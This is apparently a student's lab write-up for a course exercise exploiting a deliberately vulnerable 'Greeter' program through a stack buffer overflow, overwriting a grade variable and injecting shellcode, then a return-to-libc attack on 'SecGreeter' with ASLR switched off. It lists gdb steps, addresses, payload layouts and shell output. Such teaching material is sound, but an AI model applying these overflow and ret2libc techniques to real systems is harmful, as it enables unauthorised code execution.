### Chaintouti Maria  - 2020030129
### Cheiladakis Nikos - 2020030140

## Assignment 8
The assignment involves exploiting the "Greeter" program to grade with more than 6 and spawn a terminal shell. Additionally, in the second task includes bypassing  DEP (Data Execution Prevention) using a return-to-libc attack on the "SecGreeter" program.

The first step we did is to run the program and putting a lot of A's as an input to test it. The result was this:
What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$, your grade is 1094795585. Have a nice day.
Segmentation fault (core dumped)
This helped us understand the buffer overflow since the grade changed from the 6 it is set. Also we got a segmentation fault meaning that the overflow changed the return address.

# Part 1
 1. Finding the buffer, Grade and the return address location: 
 We started with chmod +x ./Greeter to give access and make the Greeter executable. We then procceded with the debugging (gdb ./Greeter) and put a breakpoint at readString. We found the address of the buffer and the Grade by running: print &buf (0xffffcf38), print &Grade (0xffffcf58). Then we found the return address with info frame  (eip at 0xffffcf6c).

 2. Payload generation and test:
 We found the shellcode from the internet and run a test to make sure it works. For the test we followed these commands: 
 `gcc shellcode_test.c -o shellcode_test -m32 -z execstack -fno-stack-protector`
 `./shellcode_test`
 The result was a spawned terminal shell.

 3. Input file generation:
 We wrote a python code for the exploitation which contains the payload (i.e. machine code for shell spawning) and the address of the buffer the input will be stored and also some nop padding (0's), so we succeed with the overflow of the buffer.

 4. Testing the exploit:
 For the python code to run without segmentation fault, we had to find out how many nops to add, so we once again debugged our program and with the help of the command disas readString we found from the  0x08049935 <+16>:    lea    -0x30(%ebp),%eax that the diffference from the return address is 48 bytes, so we had to cover that with the 0's. Thus, with a little experimentation we eventually reached to 27 Nops and with the 25 byte shellcode we spawned a terminal shell inside our program by redirecting the input, where we could run the commands ls and whoami which was given as examples in the exercise. The results are preseneted below.

# Questions
  1. Grade you with more than 6. Also investigate, why you cannot make Greeter grade you with ‘10’:
  As we saw earlier, the buffer overflow affected the grade too, so we know that we can somehow use it in our favor so we can grade ourselves with something more than a 6. The procedure we followed since we knew the buffer is 32 bytes was the following:
  `python3 -c 'print("A"*32 + "\x08\x00\x00\x00")' > change_grade.txt`
  With that we put in the change_grade.txt 32 A's and 8 in little endian so when we run the program with this command:
  `./Greeter < change_grade.txt`
 Our input is computes as so our grade changes to 8 instead of 6. This is possible for the numbers 0-9 but not 10. This is because in hexadecimal the number 10 is A or 0x0A in little endian which in hexadecimal we use it as a next line. So due to the fact that we use gets function it reads it as a next line ignoring that it may also be the number 10.

 # How to run
 - `chmod +x ./Greeter`
 - `python2 exploit_generator.py > exploit_input.txt`
 - `(cat exploit_input.txt ; cat) | ./Greeter`

 # Results
 1. Grade changing
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# python3 -c 'print("A"*32 + "\x08\x00\x00\x00")' > change_grade.txt
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# ./Greeter < change_grade.txt
 What is your name?
 Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, your grade is 8. Have a nice day.


 2. Exploitation
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# python2 exploit_generator.py > exploit_generator.txt
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# (cat exploit_generator.txt ; cat) | ./Greeter
 What is your name?
 Hello 1�Ph//shh/bin��P��S��
                            ̀�����������$, your grade is -1869574000. Have a nice day.
 ls
  'Assignment 8.pdf'   Python-2.7.18.tgz            exploit_New.txt           exploit_input       exploit_secGreeter.txt
  Greeter             README.md                    exploit_SecGreeter.txt    exploit_input.txt   exploit_secNew.txt
  Greeter.c           SecGreeter                   exploit_SecGreeter1.txt   exploit_input_sec   input.txt
  Greeter_secure.c    SecGreeter:Zone.Identifier   exploit_ask1.txt          exploit_sec.py      shellcode_test
  Makefile            change_grade.txt             exploit_generator.py      exploit_sec.txt     shellcode_test.c
  Python-2.7.18       exploit.txt                  exploit_generator.txt     exploit_sec2.txt    shellcode_test1
 whoami
  root


# Part 2
For the second part, we followed the steps given from this site: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc which gives a great understanding of our problem.

# Steps 
 1. We run `chmod +x ./SecGreeter` so that we give access and make executable the SecGreeter.
 2. We switched off the Address Space Layout Randomization (ASLR) with `echo 0 > /proc/sys/kernel/randomize_va_space` as was asked in the exercise.
 3. We run the program with debugging after putting a break point in main. `gdb ./SecGreeter` , `b main` , `r`
 4. We found the address of the system with `p system` (0xf7dd48f0 <system>).
 5. We found the address of the exit with `p exit`(0xf7dc35c0 <exit>)
 6. We found the start address of libc with `info proc map` (0xf7d85000 0xf7da8000    0x23000        0x0  r--p   /usr/lib32/libc.so.6) so the vulnerable program starts at 0xf7d85000.
 7. We found the offset of the string /bin/sh relative to the start of libc with the command: 
 `shell strings -a -t x /usr/lib32/libc.so.6 | grep "/bin/sh"`which had as a result: 1bcde8 /bin/sh
 8. So we computed (0xf7d85000 + 0x1bcde8 = 0xf7f41de8) as the address of string /bin/sh in our vulnerable program.
 9. We wrote a python code for the exploitation which contains the system address, the exit address, the address of /bin/sh and some padding we found through expirementation.
 This had as a result a spawned terminal shell in our program where we run the commands ls and whoami like we did in part 1. The results are preseneted below.

# How to run
- `chmod +x ./SecGreeter`
- `python2 exploit_sec.py > exploit_sec.txt`
- `(cat exploit_sec.txt ; cat) | ./SecGreeter`

# Results
1. Exploitation:
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# chmod +x ./SecGreeter
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# python2 exploit_sec.py > exploit_sec2.txt
 root@LAPTOP-QP9CC7BM:~/Assignment8/Unsolved# (cat exploit_sec2.txt ; cat) | ./SecGreeter
 What is your name?
 ls
 'Assignment 8.pdf'   Python-2.7.18.tgz            exploit_New.txt           exploit_input.txt        exploit_secNew.txt
  Greeter             README.md                    exploit_SecGreeter.txt    exploit_input_sec        input.txt
  Greeter.c           SecGreeter                   exploit_SecGreeter1.txt   exploit_sec.py           shellcode_test
  Greeter_secure.c    SecGreeter:Zone.Identifier   exploit_ask1.txt          exploit_sec.txt          shellcode_test.c
  Makefile            change_grade.txt             exploit_generator.py      exploit_sec2.txt         shellcode_test1
  Python-2.7.18       exploit.txt                  exploit_input             exploit_secGreeter.txt
 whoami
  root

